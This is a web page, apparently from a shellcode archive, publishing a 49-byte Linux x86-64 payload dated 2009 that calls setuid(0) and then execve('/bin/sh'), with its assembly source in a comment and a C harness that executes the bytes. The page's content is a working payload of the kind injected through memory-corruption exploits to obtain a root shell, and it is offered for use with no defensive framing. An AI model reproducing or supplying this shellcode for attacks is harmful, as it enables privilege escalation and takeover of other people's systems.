<html><head><title>Linux/x86-64 - setuid(0) + execve(/bin/sh) 49 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
setuid(0) + execve(/bin/sh) - just 4 fun. 
xi4oyu [at] 80sec.com
 
main(){
__asm(  &quot;xorq %rdi,%rdi\n\t&quot;
        &quot;mov $0x69,%al\n\t&quot;
        &quot;syscall \n\t&quot;
        &quot;xorq   %rdx, %rdx \n\t&quot;
        &quot;movq   $0x68732f6e69622fff,%rbx; \n\t&quot;
        &quot;shr    $0x8, %rbx; \n\t&quot;
        &quot;push   %rbx; \n\t&quot;
        &quot;movq   %rsp,%rdi; \n\t&quot;
        &quot;xorq   %rax,%rax; \n\t&quot;
        &quot;pushq  %rax; \n\t&quot;
        &quot;pushq  %rdi; \n\t&quot;
        &quot;movq   %rsp,%rsi; \n\t&quot;
        &quot;mov    $0x3b,%al; \n\t&quot;
        &quot;syscall ; \n\t&quot;
        &quot;pushq  $0x1 ; \n\t&quot;
        &quot;pop    %rdi ; \n\t&quot;
        &quot;pushq  $0x3c ; \n\t&quot;
        &quot;pop    %rax ; \n\t&quot;
        &quot;syscall  ; \n\t&quot;
);
}
*/
main() {
        char shellcode[] =
        &quot;\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62&quot;
        &quot;\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31&quot;
        &quot;\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c&quot;
        &quot;\x58\x0f\x05&quot;;
        (*(void (*)()) shellcode)();
}
 
2009-05-14
evil.xi4oyu 




<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
